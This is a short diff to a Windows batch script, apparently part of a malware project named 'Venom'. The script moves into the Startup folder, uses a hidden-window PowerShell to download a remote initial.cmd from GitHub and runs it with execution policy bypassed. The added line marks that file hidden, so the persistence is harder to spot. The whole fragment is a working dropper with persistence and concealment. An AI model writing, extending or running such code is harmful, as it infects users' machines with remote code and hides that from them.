@@ -10,6 +10,8 @@ cd %STARTUP%
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/initial.cmd -OutFile initial.cmd"
 
+attrib +h "%STARTUP%/initial.cmd"
+
 powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd
 
 cd "%INITIALPATH%"
